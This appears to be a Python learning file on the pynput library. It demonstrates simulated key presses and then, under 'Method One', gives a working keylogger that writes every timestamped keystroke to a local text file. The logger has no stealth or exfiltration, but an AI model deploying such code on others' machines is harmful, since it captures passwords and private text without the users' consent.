
"""
--------------------------------------
             Starter File

There are two types of keys that we should consider:

Regular keys – which includes letters, numbers, and signs.
Special keys – which include space, shift, ctrl, and so on.
--------------------------------------
"""

#import required modules
from pynput.keyboard import Key, Controller

#creating controler instance
keyboard = Controller()

keyboard.press('a')
keyboard.release('a')
keyboard.press(Key.space)
keyboard.release(Key.space)
keyboard.press('b')
keyboard.release('b')
keyboard.press(Key.space)
keyboard.release(Key.space)
keyboard.press('c')
keyboard.release('c')
keyboard.press(Key.space)
keyboard.release(Key.space)
keyboard.press('d')
keyboard.release('d')
keyboard.press(Key.space)
keyboard.release(Key.space)


#Try this code and note the output - "Ab"

"""
***********************************************************
#press & release logic

from pynput.keyboard import Key, Controller

keyboard = Controller()

with keyboard.pressed(Key.shift):
keyboard.press('a')
keyboard.release('a')
keyboard.press('b')
keyboard.release('b')

***********************************************************
References
pynput.readthedocs.io(2021).https://pynput.readthedocs.io/en/latest/keyboard.html#pynput.keyboard.Key.DateAccessed:09/12/21
"""


from pynput.keyboard import Key, Controller

keyboard = Controller()

with keyboard.pressed(Key.shift):
    keyboard.press('a')
    keyboard.release('a')
keyboard.press('b')
keyboard.release('b')

"""
--------------------------------------
             Method One
--------------------------------------
"""

#import required libraries 
from pynput.keyboard import Key, Listener #purpose? read keystrokes as the user types in stuff
import logging #stores the data into a file for later use...

#First, specifiy the file name followed by the format 'YY-MM-DD HH-MM-SS(ms) -key' in which the keystrokes will be stored.
logging.basicConfig(filename=("Quickkeylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") 

#Second, log the key pressed by the user into a file after converting it into a string
def on_press(key):
    logging.info(str(key))

#creating an instance of a listener to record key strokes with
with Listener(on_press=on_press) as listener :
    listener.join()


"""
--------------------------------------
*************************************************************
References

Pynput(2021).https://pynput.readthedocs.io/en/latest/index.html.DateAccessed:09/12/2021
AskPython.com(2021).https://www.askpython.com/python/examples/python-keylogger.DateAccessed:09/12/21
**************************************************************
--------------------------------------
"""




